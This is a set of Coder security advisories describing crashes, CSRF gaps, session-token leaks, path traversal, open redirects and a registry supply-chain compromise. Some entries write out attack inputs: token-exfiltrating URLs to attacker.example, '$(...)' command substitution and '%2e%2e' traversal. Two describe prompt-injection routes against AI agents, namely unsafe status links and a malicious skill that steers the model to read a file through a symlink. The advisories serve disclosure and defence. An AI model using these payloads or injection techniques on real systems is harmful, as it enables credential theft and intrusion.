advisories.title: Nil node in tailnet `UpdateSelf` coordinate request lets any authenticated user crash `coderd`
advisories.summary:
### Summary

Any authenticated user, or anyone holding a workspace agent token, could crash the Coder server (`coderd`) by sending a single malformed message to the tailnet coordinator.

### Details

The tailnet coordinator authorized each incoming `CoordinateRequest` before checking that it was well formed. `ClientCoordinateeAuth`, `ClientUserCoordinateeAuth`, and `AgentCoordinateeAuth` in `tailnet/tunnel.go` read `UpdateSelf.Node` fields without checking that `Node` was set. A request with `UpdateSelf` present but `Node` empty caused a nil pointer dereference.

The dereference ran in the coordinator's per-peer goroutine, in both the in-memory coordinator (`tailnet/coordinator.go`) and the enterprise PostgreSQL coordinator (`enterprise/tailnet/connio.go`). These goroutines did not recover from panics, so a single malformed message stopped the whole `coderd` process.

### Impact

Any authenticated user could crash `coderd` with a single message and repeat it after each restart to keep the deployment unavailable. Since v2.18.0 this does not require access to a workspace; in earlier versions the user needed SSH access to a workspace. Anyone holding a workspace agent token could do the same. No elevated role is needed, and rate limiting does not help because the attack is not volumetric. The crash disconnects all users served by the affected `coderd` replica, not only the attacker.

This affects availability only. No data is exposed or modified. In deployments with multiple `coderd` replicas, each crash affects the replica the attacker is connected to. `coderd` normally restarts automatically, so each crash causes a short outage.

### Patches

The fix validates the structure of every `CoordinateRequest` before authorization or any state change, in both coordinators, and rejects requests with a missing `UpdateSelf.Node` or nil `ReadyForHandshake` entries. Per-connection coordinator goroutines now recover from unexpected panics and close only the affected connection. The fix also stops request processing after a disconnect and prevents a peer from being removed twice during cleanup, which could otherwise panic on a closed channel.

The fix is available in the following releases:

| Release line            | Patched version                                                  |
| ----------------------- | ---------------------------------------------------------------- |
| 2.39 (Mainline)         | [v2.39.0](https://github.com/coder/coder/releases/tag/v2.39.0)   |
| 2.38 (Stable)           | [v2.38.0](https://github.com/coder/coder/releases/tag/v2.38.0)   |
| 2.37 (Security Support) | [v2.37.3](https://github.com/coder/coder/releases/tag/v2.37.3)   |
| 2.36                    | [v2.36.7](https://github.com/coder/coder/releases/tag/v2.36.7)   |
| 2.35                    | [v2.35.9](https://github.com/coder/coder/releases/tag/v2.35.9)   |
| 2.34 (ESR)              | [v2.34.12](https://github.com/coder/coder/releases/tag/v2.34.12) |
| 2.29 (ESR)              | [v2.29.27](https://github.com/coder/coder/releases/tag/v2.29.27) |

Release lines 2.35 and 2.36 are end-of-life but received the fix in v2.35.9 and v2.36.7. Release lines 2.30 through 2.33 are end-of-life and will not receive a patch. Users on any end-of-life line should upgrade to a patched supported release.

### Workarounds

None. Upgrade to a patched release.

### References

- Fix: [#29300](https://github.com/coder/coder/pull/29300)

### Credits

We'd like to thank [Jon David Black](https://github.com/jondavid-black) and Max Maleynov for independently disclosing this issue!

advisories.title: Agent-supplied app status links can use unsafe URL schemes
advisories.summary:
### Summary

A workspace agent can attach a link to an app status update. Coder saved that link without checking its URL scheme and showed it as a clickable link in the dashboard. A malicious or compromised workspace could use this to show other users an unsafe link.

### Details

Workspace agents report app status through the agent API, which includes an optional `uri` field. Coder saved this value as sent and showed it as a link in the workspaces list and the workspace app status panel, and on releases before 2.38, in the task page header.

Any process in the workspace that holds the agent token can set this value. That includes an AI agent running a task, which could be steered by prompt injection.

The dashboard's Content Security Policy (`script-src 'self'`) stops `javascript:` links from running scripts in the Coder dashboard.

The fix makes the server keep status links only if they use `http`, `https` or `file`, and reject values with control characters. A disallowed link is dropped, but the status update is still saved.

### Impact

A user who controls a workspace agent, including an AI agent steered by prompt injection, can show an unsafe link to anyone who views that workspace or task, such as a template admin or a user it's shared with. A user who clicks it can be sent to a phishing site or a non-web application. The dashboard's Content Security Policy blocks `javascript:` links from running scripts in the Coder dashboard.

### Patches

| Release line | Patched version |
|---|---|
| 2.39 (Mainline) | [v2.39.0](https://github.com/coder/coder/releases/tag/v2.39.0) |
| 2.38 (Stable) | [v2.38.7](https://github.com/coder/coder/releases/tag/v2.38.7) |
| 2.37 (Security Support) | [v2.37.11](https://github.com/coder/coder/releases/tag/v2.37.11) |
| 2.34 (ESR) | [v2.34.19](https://github.com/coder/coder/releases/tag/v2.34.19) |
| 2.29 (ESR) | [v2.29.27](https://github.com/coder/coder/releases/tag/v2.29.27) |

Release lines 2.30 to 2.33, 2.35 and 2.36 are end-of-life. Users on any end-of-life line should upgrade to a patched release.

The fix applies to new status updates. Status links saved before upgrading are not changed and stay visible until the agent reports a new status.

App status links that use other schemes, such as `vscode://`, are no longer saved.

### Workarounds

There's no full workaround short of upgrading. Users should avoid clicking app status links from workspaces they don't trust.

### References

- https://github.com/coder/coder/pull/31262

### Credits

We'd like to thank a customer security team and Jon David Black (@jondavid-black), who reported this independently.

advisories.title: coder open app sends the session token to untrusted template app URLs
advisories.summary:
### Summary

`coder open app` replaced `$SESSION_TOKEN` in an external app's URL with the user's real session token whenever the app was defined in the template, wherever the URL pointed. A template author could use this to collect the session token of any user who opened the app from the CLI. The dashboard refused to do this, so the CLI and the dashboard handled the same app differently.

### Details

The fix for CVE-2026-55431 (GHSA-v54h-cp2w-9x4g) stopped the CLI from adding the session token to external apps registered from inside a workspace. Apps defined in the template were still treated as trusted, and the CLI added the token with no check on the URL's scheme or destination.

A template author could set an external app's URL to `https://attacker.example/?t=$SESSION_TOKEN`, or to an IDE link that points at another server, such as `vscode://coder.coder-remote/open?url=https://attacker.example&token=$SESSION_TOKEN`. When a user ran `coder open app` on that app, the CLI added their token and opened the URL.

The dashboard has never added the token to an `http` or `https` URL. It started rejecting IDE links that point at another server in GHSA-2x8w-q434-f76p, so on releases older than that fix the dashboard was affected by the IDE-link case too.

The fix applies the dashboard's rule to the CLI. The CLI now adds the session token only when the link opens a known Coder IDE handler, its `url` parameter is this deployment with no path, and the placeholder is the whole value of its `token` parameter. Any other link with the placeholder is printed with a warning and not opened.

### Impact

A template author already receives the workspace owner's token when the workspace is built. What this adds is the token of any other user who opens the app from the CLI, such as a user the workspace is shared with or an administrator helping with the workspace. The attacker can then act as that user, with that user's permissions, until the token expires.

The victim has to run `coder open app` on the app. Opening the same app from the dashboard was not affected, on releases that include the dashboard fix from GHSA-2x8w-q434-f76p.

This is rated Medium, lower than GHSA-v54h-cp2w-9x4g, because only a template author can set up the attack. In GHSA-v54h-cp2w-9x4g, any code running inside a workspace could register the malicious app. Template authors are a trusted role: they already control what runs in every workspace built from their templates and already receive the workspace owner's token.

### Patches

| Release line | Fixed version |
|---|---|
| 2.39 (mainline) | v2.39.1 |
| 2.38 (stable) | v2.38.7 |
| 2.37 (security support) | v2.37.11 |
| 2.34 (ESR) | v2.34.19 |
| 2.29 (ESR) | v2.29.27 |

Templates whose external apps don't meet the dashboard's rule will stop receiving a token from `coder open app`, as they already do in the dashboard. The link must open a Coder IDE handler, its `url` parameter must be this deployment with no path, and the placeholder must be the whole value of its `token` parameter.

### Workarounds

On releases that include the dashboard fix from GHSA-2x8w-q434-f76p, open external apps from the dashboard rather than with `coder open app`. Template administrators can review external app URLs that contain `$SESSION_TOKEN` and limit who can create or edit templates.

### References

- https://github.com/coder/coder/pull/31721
- GHSA-v54h-cp2w-9x4g
- GHSA-2x8w-q434-f76p

### Credits

We'd like to thank @manus-use, Anthropic's Security Team (ANT-2026-3ZZB56HZ) and Adam Korczynski of [Ada Logics](https://adalogics.com/), who reported and validated this issue, and our internal security team, who identified it independently.

advisories.title: AWS IAM database authentication can expose a temporary database password in API errors
advisories.summary:
### Summary

When a Coder deployment uses AWS IAM authentication for its PostgreSQL database and fails to open a new database connection, the resulting error can include the database connection URL. That URL contains a short-lived database password. Coder returned this error in API responses, including to unauthenticated requests.

### Details

With `CODER_PG_AUTH=awsiamrds`, Coder generates an IAM authentication token for each new database connection and adds it to the connection URL as the password. If opening the connection failed, the error message included the full URL. This error was also written to the Coder server logs and CLI output on each connection retry, so the token was exposed to anyone with access to those logs.

The API key middleware returned database errors in the `detail` field of its response. A request with an API key that is correctly formatted but not valid causes a database lookup, so anyone who can reach the Coder API could get this error without logging in.

The error only appears while Coder is failing to open new connections to the database, for example during a database outage or failover. The generated password is valid for 15 minutes.

The fix removes the connection URL from the driver's error, and the API key middleware no longer includes internal error details in its response.

### Impact

During a database connection failure, an unauthenticated attacker who can reach the Coder API could get a temporary password for the Coder database, along with its host, port and username. The password is valid for 15 minutes.

An attacker who can also reach the database over the network could use it to read, change or delete Coder's data, including user accounts and roles. Changes made during that window persist, so an attacker could grant themselves access that outlasts the password.

Deployments that don't use `CODER_PG_AUTH=awsiamrds` are not affected.


### Patches

| Release line | Fixed version |
|---|---|
| 2.39 (mainline) | v2.39.1 |
| 2.38 (stable) | v2.38.7 |
| 2.37 (security support) | v2.37.11 |
| 2.34 (ESR) | v2.34.19 |
| 2.29 (ESR) | v2.29.27 |

### Workarounds

Restrict network access to the database so only Coder can connect to it. Limit the database user's permissions to what Coder needs. These limit the impact but don't prevent the password from appearing in errors; upgrade to a fixed version.

### References

- https://github.com/coder/coder/pull/31850

### Credits

We'd like to thank a customer security team, Jon David Black (@jondavid-black) and Thomas Kosiewski (@ThomasK33) from our internal development team for reporting this issue.

advisories.title: Crafted workspace agent RPC calls could crash coderd
advisories.summary:
### Summary
A workspace agent could crash the Coder server (`coderd`) by sending certain calls over the agent API connection. A user with access to a workspace could use the agent token inside it to repeatedly crash `coderd` and disrupt the deployment for other users.

### Details
Several handlers reachable from the agent API connection could panic on input from the agent:

- `UpdateLifecycle`, `UpdateStartup` and `BatchUpdateMetadata` read fields of the request's sub-message without checking that it was set, so a message without the sub-message caused a nil pointer dereference.
- The agent connection also exposed the Tailnet `RefreshResumeToken` and `WorkspaceUpdates` calls, which agents don't use. Their providers aren't set up on agent connections, so calling them caused a nil pointer dereference.

The agent API is served over dRPC, which did not recover from panics in handlers, so any of these panics stopped the whole `coderd` process.

### Impact
An attacker with a workspace agent token could crash `coderd` with a single call, and repeat it to keep the deployment unavailable. This affects availability only. No data is exposed or modified.

The impact is limited in several ways. The attacker needs access to a workspace, and the agent token identifies that workspace and its owner. An administrator can stop the attack by stopping the workspace, which invalidates its agent token, and suspending the user so they can't start it again. `coderd` normally restarts automatically after a crash, so each crash causes a short outage. In deployments with multiple `coderd` replicas, each crash affects only the replica the agent is connected to.

### Patches
Coder now recovers from panics in its dRPC handlers, so a bad call fails only that request and `coderd` keeps running. Agent connections also no longer expose the unsupported Tailnet calls. Later releases additionally reject agent API messages with a missing sub-message with an `InvalidArgument` error.

| Release line | Patched version |
|---|---|
| 2.39 (Mainline) | [v2.39.0](https://github.com/coder/coder/releases/tag/v2.39.0) |
| 2.38 (Stable) | [v2.38.0](https://github.com/coder/coder/releases/tag/v2.38.0) |
| 2.37 (Security Support) | [v2.37.1](https://github.com/coder/coder/releases/tag/v2.37.1) |
| 2.34 (ESR) | [v2.34.10](https://github.com/coder/coder/releases/tag/v2.34.10) |
| 2.29 (ESR) | [v2.29.21](https://github.com/coder/coder/releases/tag/v2.29.21) |

Release lines 2.30 to 2.33, 2.35 and 2.36 are end-of-life. 2.35 and 2.36 received the fix in v2.35.8 and v2.36.5. Users on any end-of-life line should upgrade to a patched release.

### Workarounds
None. Upgrade to a patched release.

### References
- https://github.com/coder/coder/pull/28429
- https://github.com/coder/coder/pull/29150

### Credits
We'd like to thank a customer security team for reporting this issue.

advisories.title: CSRF protection skipped for API paths matching unanchored exemption patterns
advisories.summary:
### Summary
Coder's CSRF protection exempts a short list of routes used by agents, workspace proxies and other non-browser clients. The list was matched as unanchored regular expressions, so any API path that only contained one of the patterns, such as `derp` or `api/v2/workspaceagents`, skipped both the CSRF token check and the same-origin check. A page on the same site as the Coder deployment could make a signed-in user's browser send some state-changing requests to Coder without their knowledge.

### Details
The exemptions in `coderd/httpmw/csrf.go` were written like shell wildcards (for example `derp/*` and `api/v2/workspaceagents/*`) but are matched as unanchored regular expressions. As a result:

- `api/v2/workspaceagents/*` exempted every route under `/api/v2/workspaceagents/`, including routes users call from the dashboard with their session cookie, such as recreating or deleting a dev container.
- `derp/*` exempted any path containing the text `derp`, such as user or organization member routes for a username that contains `derp`.

An exempt request skips both the CSRF token check and the same-origin check.

### Impact
An attacker who can get a signed-in user to load a page that is same-site with the Coder deployment, for example a workspace app or shared port on the wildcard access URL, could forge simple `POST` requests to the affected routes as that user. Examples include recreating the user's dev container, which removes data that is not on a mounted volume, or, if the victim is an Owner or User Admin, adding a user whose name contains `derp` to an organization.

Requests that need a CORS preflight, such as `PUT` and `DELETE`, are blocked in every configuration, because Coder never allows credentialed cross-origin requests with those methods. User roles cannot be changed this way. Deployments started with `--samesite-auth-cookie none` can be attacked from any website, not only same-site pages.

### Patches
Each exemption is now anchored so it matches only the route it was written for. Routes that users call with a session cookie are no longer exempt.

| Release line | Patched version |
|---|---|
| 2.39 (Mainline) | [v2.39.0](https://github.com/coder/coder/releases/tag/v2.39.0) |
| 2.38 (Stable) | [v2.38.6](https://github.com/coder/coder/releases/tag/v2.38.6) |
| 2.37 (Security Support) | [v2.37.10](https://github.com/coder/coder/releases/tag/v2.37.10) |
| 2.34 (ESR) | [v2.34.18](https://github.com/coder/coder/releases/tag/v2.34.18) |
| 2.29 (ESR) | [v2.29.26](https://github.com/coder/coder/releases/tag/v2.29.26) |

Release lines 2.30 to 2.33, 2.35 and 2.36 are end-of-life and will not receive a patch. Users on these lines should upgrade to a patched release.

### Workarounds
Keep the default `--samesite-auth-cookie lax`, and avoid opening untrusted workspace apps or shared ports while signed in to Coder.

### References
- Fix: https://github.com/coder/coder/pull/31125

### Credits
We'd like to thank a customer security team for reporting this issue, and Anthropic's Security Team (ANT-2026-XABYHG6B) and Adam Korczynski of [Ada Logics](https://adalogics.com/) for reporting and validating it.

advisories.title: Coder Agents read_skill_file could follow symlinks outside the skill directory
advisories.summary:
### Summary

The Coder Agents `read_skill_file` tool reads supporting files from a skill's directory in the workspace. It checked the requested path lexically, then read the file through the workspace agent's general file reader, which follows symbolic links. A supporting file that was a symlink to a file outside the skill directory returned that file's contents to the model.

> **Note:** Only deployments using Coder Agents with workspace skills are affected. Release line 2.29 does not include skills and is not affected.

### Details

`validateSkillFilePath` in `coderd/x/chatd/chattool/skill.go` rejected absolute paths, `..` components and hidden components, but did not resolve symlinks. `LoadSkillFile` then joined the skill directory and the requested path and passed the result to the agent's `read-file` endpoint, which opened it with no check that the resolved file stayed inside the skill directory.

### Impact

A malicious or compromised skill could include an innocent-looking supporting file that is a symlink to another file in the workspace, and instruct the model to read it with `read_skill_file`. The target file's contents would then enter the model context and chat history.

The read is limited to files the workspace agent's user can already read inside that workspace. It does not cross workspaces, escape the container or reach the host. An attacker needs a way to place a malicious skill in the victim's workspace, and the victim needs to run a chat that uses it.

### Patches

The agent's `read-file` endpoint now accepts an optional `root` parameter, and `read_skill_file` reads supporting files through it. The agent opens the skill directory with Go's `os.OpenRoot` and the file with `Root.Open`, which follows symlinks only while they stay inside the directory. Absolute symlinks, links that climb out of the skill directory, and a skill directory that is itself a symlink are refused. Relative symlinks that stay inside the skill directory still work.

This is a behavior change: workspaces running an agent older than the patched release reject the new parameter, so `read_skill_file` fails until the workspace is restarted with the updated agent.

The fix was backported to the following release lines:

| Release line | Patched version |
|---|---|
| 2.39 (Mainline) | [v2.39.0](https://github.com/coder/coder/releases/tag/v2.39.0) |
| 2.38 (Stable) | [v2.38.5](https://github.com/coder/coder/releases/tag/v2.38.5) |
| 2.37 (Security Support) | [v2.37.9](https://github.com/coder/coder/releases/tag/v2.37.9) |
| 2.36 | [v2.36.12](https://github.com/coder/coder/releases/tag/v2.36.12) |
| 2.34 (ESR) | [v2.34.17](https://github.com/coder/coder/releases/tag/v2.34.17) |

Release lines 2.32, 2.33 and 2.35 are end-of-life and will not receive a patch. Users on these lines should upgrade to a patched release.

### Workarounds

Until you upgrade, only install skills from trusted sources, and review skill directories for symbolic links.

### References

- Fix: https://github.com/coder/coder/pull/31462

### Credits

We'd like to thank a customer security team for reporting this issue.

advisories.title: Coder 2.38.0 before 2.38.4 Authorization Bypass via External Agent Credentials Endpoint
advisories.summary: Coder 2.26.0 before 2.29.24, 2.30.0 before 2.34.16, 2.35.0 before 2.36.11, 2.37.0 before 2.37.8, and 2.38.0 before 2.38.4 contains an improper authorization flaw in the external agent credentials endpoint, which returns the workspace agent token to users with only workspace read access rather than ssh permission. Authenticated users with roles such as Template Admin or Organization Admin can use the token to read the owner's private Git SSH key and Git provider OAuth tokens, and impersonate the agent to receive the owner's sessions.

advisories.title: Coder from 2.38.0 before 2.38.4 Memory Exhaustion DoS via Web Push
advisories.summary: Coder 2.21.0 before 2.29.24, 2.30.0 before 2.34.16, 2.35.0 before 2.36.11, 2.37.0 before 2.37.8, and 2.38.0 before 2.38.4 reads Web Push endpoint responses in webpushSend with io.ReadAll, without a size limit or client timeout. Any authenticated user can register a subscription via POST /api/v2/users/{user}/webpush/subscription pointing to a server returning an endless body, exhausting coderd memory and crashing the API, dashboard, and workspace connections.

advisories.title: Coder from 2.38.0 before 2.38.4 Privilege Escalation via API Key Creation
advisories.summary: Coder 2.28.0 before 2.29.24, 2.30.0 before 2.34.16, 2.35.0 before 2.36.11, 2.37.0 before 2.37.8, and 2.38.0 before 2.38.4 does not restrict new API keys to the creating token's scopes, allow list, or expiry. A scoped API key or OAuth2 token holding key-creation permission can call POST /api/v2/users/{user}/keys/tokens to mint longer-lived coder:all keys, gaining the user's full privileges.

advisories.title: Coder 2.38.0 before 2.38.2 Session Token Leak via Sub-Agent External Apps
advisories.summary: The web dashboard in Coder 2.24.0 before 2.29.23, 2.30.0 before 2.34.14, 2.35.0 before 2.36.9, 2.37.0 before 2.37.6, and 2.38.0 before 2.38.2 replaces the $SESSION_TOKEN placeholder in external app URLs with a full-access API key without checking whether the app belongs to a sub-agent. Code running in a workspace can register a disguised sub-agent app with a custom protocol URL, so the owner's click sends their API key to an attacker-chosen destination.

advisories.title: Coder before 2.29.22, 2.34.13, 2.35.10, 2.36.8, 2.37.5, and 2.38.1 AI Gateway Path Traversal
advisories.summary: Coder 2.28.0 before 2.29.22, 2.30.0 before 2.34.13, 2.35.0 before 2.35.10, 2.36.0 before 2.36.8, 2.37.0 before 2.37.5, and 2.38.0 before 2.38.1 contains a path traversal vulnerability in the AI Gateway passthrough router, which forwards percent-encoded dot segments upstream without rejecting them. Authenticated users can send paths such as %2e%2e or ..%2F under allowlisted prefixes to reach unintended provider endpoints using the deployment's centrally managed provider key.

advisories.title: Coder before 2.23.0 Session Expiration Bypass via OIDC Without Refresh Token
advisories.summary: Coder before 2.23.0 contains a session expiration bypass vulnerability that allows authenticated users to retain access after OIDC token expiry when no refresh token is issued. Users can keep their APIKey cookie active through regular use, extending it every 24 hours to access Coder indefinitely after losing OIDC authorization.

advisories.title: Coder 2.3.1 before 2.16.1 Open Redirect via Login Page redirect Parameter
advisories.summary: Coder 2.3.1 before 2.14.4, 2.15.x before 2.15.3, and 2.16.0 before 2.16.1 contains an open redirect vulnerability in the login page because the redirect query parameter is improperly sanitized. Attackers can craft a Coder login URL that, when clicked by a logged-in user, redirects the victim to an attacker-controlled website for phishing.

advisories.title: Coder before 2.29.21, 2.34.12, 2.35.9, 2.36.7, and 2.37.4 Missing Audience Validation in GCP Instance-Identity Authentication
advisories.summary: Coder before 2.29.21, 2.30.0 before 2.34.12, 2.35.0 before 2.35.9, 2.36.0 before 2.36.7, and 2.37.0 before 2.37.4 does not validate the audience claim of GCE instance-identity JWTs at the POST /api/v2/workspaceagents/google-instance-identity endpoint. Attackers who obtain an unexpired format=full identity token minted for another relying party can replay it to obtain that workspace agent's session token, which remains valid until the workspace's next build.

advisories.title: Malicious Packages Served from Unauthorized Registry Server
advisories.summary:
### Impact

An unidentified malicious actor gained access to Coder’s Cloudflare infrastructure and added unauthorized IP addresses to the pool used for Coder’s module registry. These unauthorized IP addresses hosted a version of Coder’s registry that contained artifacts which included malicious code. The result was that for a short period of time Coder’s module registry website was serving a malicious version of our artifacts to a subset of our users. This malicious code was designed to identify a number of credentials and exfiltrate those to a remote server with a lookalike domain name compared to one Coder regularly uses.

Users who use the main Coder module registry (registry.coder.com) for their template source and who updated components during the time period when this code was available may have installed the malicious packages and been impacted by the credential stealing malicious software.

At this time we have no indication that any customer data maintained by Coder was impacted in any way.

### Patches

At this time, we recommend running the steps below manually to verify if the terraform module versions and possibly purge any impacted module from the cache.

### Workarounds

We are advising that any user who a create a new workspace template, update a template version, ran a dry run of template build or deployed a Coder workspace on a cluster that has terraform module caching disabled between 07:35 UTC on Monday, August 31st and 21:45 UTC on Monday, August 31st perform the following:

#### Determine if you may have been impacted

Due to the nature of this attack, where a malicious server that we do not own was communicating with impacted deployments, we do not have the ability to conclusively determine which users may have been affected. Therefore we recommend that you individually review and determine whether you may be impacted.

Review the timeline of any Coder workspace deployments that may have taken place as well as the Indicators of Compromise that are listed below to see if your deployments may have been impacted.

You may have been impacted if your Coder deployment downloaded a Coder Registry module between 07:35 UTC on Monday, August 31st and 21:45 UTC on Monday, August 31st. This primarily occurs when new templates or template versions are created, but can also occur independently during workspace creation when module caching is disabled on your template settings (this is enabled by default). As a result, workspaces created from templates that downloaded affected modules may also be impacted.

To identify potential cases of data loss, review firewall, proxy, DNS, and VPC flow logs for outbound traffic to `coder-infra[.]com`.

We have provided a SQL query you can run against your Coder deployment to identify potentially affected cached modules and template versions:

```sql
-- Queries to help identify usage of modules fetched in the identified window.
-- A template-import had to occur during the window for the templates/workspaces to surface here.
-- And only template-imports that downloaded the module in the window.


-- All templates that used a module fetched during the window
SELECT
   t.name  AS template,
   tv.name AS template_version,
   tv.id   AS template_version_id,
   f.id    AS module_file_id,
   f.created_at AS module_cached_at,
   tv.created_at AS version_created_at
FROM files f
        JOIN template_version_terraform_values tvtv
             ON tvtv.cached_module_files = f.id
        JOIN template_versions tv
             ON tv.id = tvtv.template_version_id
        JOIN templates t
             ON t.id = tv.template_id
WHERE f.created_by = '00000000-0000-0000-0000-000000000000'
 AND f.mimetype = 'application/x-tar'
 AND f.created_at >= '2026-08-31 07:35:00+00'
 AND f.created_at < '2026-08-31 21:45:00+00'
ORDER BY t.name, tv.created_at;


-- All workspaces that used a module fetched during the window
SELECT
   w.name AS workspace,...

advisories.title: Coder before 2.34.7 IP Spoofing via X-Forwarded-For Header
advisories.summary: Coder before 2.34.7 contains an IP spoofing vulnerability in the ExtractRealIPAddress middleware that trusts the leftmost, client-supplied X-Forwarded-For value instead of the client IP appended by a reverse proxy. Attackers can send forged X-Forwarded-For values through appending proxies to bypass per-IP rate limits on login, one-time passcode, and password validation endpoints, enabling brute-force attacks, and to falsify IP addresses recorded in audit logs.

advisories.title: Coder 2.30.0 before 2.34.8 Cross-Organization File Disclosure via DownloadFile RPC
advisories.summary: Coder from 2.30.0 before 2.34.8 contains an authorization bypass vulnerability in the provisioner daemon DownloadFile gRPC handler that allows authenticated provisioner daemons to download other organizations' cached Terraform module archives. Attackers with an org-scoped provisioner key and a known file UUID can retrieve module source code exposing infrastructure topology or embedded secrets.

advisories.title: Coder from 2.26.0 before 2.34.8 Information Disclosure via Workspace ACL Endpoint
advisories.summary: Coder from 2.26.0 before 2.34.8 contains an incorrect authorization flaw in the GET /api/v2/workspaces/{id}/acl endpoint, which checks only workspace read access and then fetches group members using an elevated system context. Authenticated users granted workspace use access can query the endpoint to harvest group members' emails, login types, status, and last-seen and creation timestamps.

advisories.title: Coder 2.0.0 before 2.34.8 Open Redirect via Workspace App Proxy
advisories.summary: Coder from 2.0.0 before 2.34.8 contains an open redirect vulnerability in handleAPIKeySmuggling that allows attackers to redirect users externally via unsanitized r.URL.Path values. Attackers can craft links on trusted workspace app subdomains with paths beginning with double slashes, which become scheme-relative redirects to attacker sites for phishing.

advisories.title: Coder from 2.10.0 before 2.34.8 Information Disclosure via Agent /debug/manifest
advisories.summary: Coder from 2.10.0 before 2.34.8 has an unauthenticated agent debug HTTP server on 127.0.0.1:2113 whose /debug/manifest handler returns the full agent manifest, including template-provided environment variable values. A lower-privileged Unix user or process in the same workspace can query this endpoint to read credentials such as cloud keys or registry tokens.

advisories.title: Coder before 2.35.4 Credential Theft via Workspace Proxy Hostname Prefix Match
advisories.summary: Coder before 2.29.20, 2.33.0 before 2.33.12, 2.34.0 before 2.34.8, and 2.35.0 before 2.35.4 contains an improper hostname validation flaw in GetWorkspaceProxyByHostname whose SIMILAR TO pattern performs a prefix match, so any domain that is a string prefix of a workspace-proxy access URL is trusted as a proxy. Attackers owning such a domain can lure an authenticated victim to a crafted /api/v2/applications/auth-redirect link, capture the redirected application_connect API key, and replay it to access the victim's workspace apps.

advisories.title: Coder 2.0.0 before 2.34.8 Authorization Bypass via User-Level ACL in RBAC Policy
advisories.summary: Coder from 2.0.0 before 2.34.8 contains an incorrect authorization vulnerability in the acl_allow rule of coderd/rbac/policy.rego, which does not verify organization membership for per-user ACL entries, and organization member removal does not scrub those entries. Authenticated users removed from an organization can keep accessing previously granted org-scoped resources such as templates and workspaces via the API.

advisories.title: Coder vulnerable to workspace auto-creation via crafted URL parameters without user consent
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7 and 2.30.2, the `dotfiles` registry module passed unsanitized user input to shell commands, allowing arbitrary code execution inside a provisioned workspace. Any user who supplied a crafted `dotfiles_uri` value (for example, one containing shell command substitution such as `$(...)`) could achieve command execution in their own workspace. The Create Workspace page's `mode=auto` deep links amplified this into a one-click attack: an attacker could craft a URL that prefilled `param.dotfiles_uri` and silently provisioned a workspace with the attacker-controlled value, with no explicit user confirmation. In versions 2.29.7 and 2.30.2, input validation was added to the dotfiles module to reject URIs and usernames containing special characters, and the unsafe `eval`/`sh -c` usage was removed. This eliminated the command injection at its source.

advisories.title: Coder: Workspace agent API insecure redirect handling allowed cross-agent file read and write
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to 2.29.19, 2.32.9, 2.33.10, and 2.34.4, agentConn.apiClient() follows redirects while its custom transport accepts the host from the redirected request URL when the port is the workspace agent HTTP API port 4. An authenticated user who controls a modified workspace agent and knows another online agent's UUID can derive the victim's tailnet address and redirect control-plane requests to that agent. HTTP 301, 302, and 303 redirects can redirect read requests, while HTTP 307 and 308 preserve replayable write and process-start requests. The redirected workspace agent file APIs can read or write files as the victim workspace user, and affected versions exposing the workspace agent process API can execute commands after a redirected file write, crossing workspace and tenant boundaries. This issue is fixed in versions 2.29.19, 2.32.9, 2.33.10, and 2.34.4.

advisories.title: Coder's workspace app CORS origin check can be bypassed via UUID-based subdomain spoofing
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.17, 2.32.7, 2.33.8, and 2.34.2, Coder's subdomain-based workspace app proxy allowed the same-owner CORS check to be bypassed. When a workspace-name subdomain segment parsed as a UUID, the workspace was resolved by ID without confirming the URL's username matched the real owner, while the CORS middleware trusted the unverified username in the hostname. Practical exploitation requires subdomain app routing (wildcard hostname) enabled and a victim who visits the attacker's crafted app URL while authenticated. The fix in versions 2.29.17, 2.32.7, 2.33.8, and 2.34.2 validates the subdomain username against the resolved workspace's actual owner and bases the same-owner CORS decision on the authoritative owner identity. No known workarounds are available.

advisories.title: Coder vulnerable to stored HTML injection via workspace agent logs in AgentLogLine component
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.17, 2.32.7, 2.33.8, and 2.34.2, the `AgentLogLine` dashboard component instantiated `ansi-to-html` without `escapeXML: true` and inserted the result via `dangerouslySetInnerHTML` so HTML embedded in workspace agent log lines was rendered as live markup. Server-side sanitization did not neutralize HTML metacharacters. Exploitation requires a victim to view attacker-controlled agent logs in the dashboard. The fix in versions 2.29.17, 2.32.7, 2.33.8, and 2.34.2 enables `escapeXML: true` so HTML metacharacters are escaped before DOM insertion. No known workarounds are available.

advisories.title: Suspended Coder users retain access to AI Bridge LLM proxy endpoints
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Starting in version 2.30.0 and prior to versions 2.32.7, 2.33.8, and 2.34.2, AI Bridge proxy endpoints authenticate via `Server.IsAuthorized` in `coderd/aibridgedserver`, which validates key format, expiry, secret and deleted or system users but does not check whether the account is suspended. Because suspension does not revoke existing API keys, a suspended user's unexpired token keeps working. Practical impact is limited to already-issued API keys of suspended users until those keys are deleted. Versions 2.32.7, 2.33.8, and 2.34.2 patch the issue. As a workaround, on suspension, delete the user's API keys via `DELETE /api/v2/users/{user}/keys`.

advisories.title: Coder's AI Bridge Proxy skips TLS certificate verification in default configuration
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Starting in version 2.30.0 and prior to versions 2.32.7, 2.33.8, and 2.34.2, the AI Bridge Proxy (`aibridgeproxyd`) created a goproxy server whose default transport set `InsecureSkipVerify: true` and only assigned a secure transport when an upstream proxy was configured. In the default configuration (no upstream proxy), outbound HTTPS to the Coder access URL accepted any TLS certificate. Practical exploitation requires an on-path (man-in-the-middle) position between the AI Bridge Proxy and the Coder server. Deployments where they are co-located over loopback are effectively unaffected. The fix in versions 2.32.7, 2.33.8, and 2.34.2 applies the secure transport (TLS 1.2 or higher using system root CAs) unconditionally. As a workaround, ensure the Coder access URL uses a trusted certificate and secure the network path between the AI Bridge Proxy and the Coder server (for example, loopback or mTLS).

advisories.title: Coder vulnerable to denial of service via unbounded request body in AI Bridge provider endpoints
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Starting in version 2.33.0 and prior to versions 2.33.8 and 2.34.2, AI Bridge provider handlers read request bodies with `io.ReadAll` without a maximum size so an authenticated user with AI Bridge access could send an arbitrarily large body and exhaust memory. Exploitation requires authenticated access to the AI Bridge endpoints and the impact is limited to availability (denial of service). Versions 2.33.8 and 2.34.2 patch the issue. No known workarounds are available.

advisories.title: Coder before 2.34.2 Stored HTML Injection via Appearance Settings
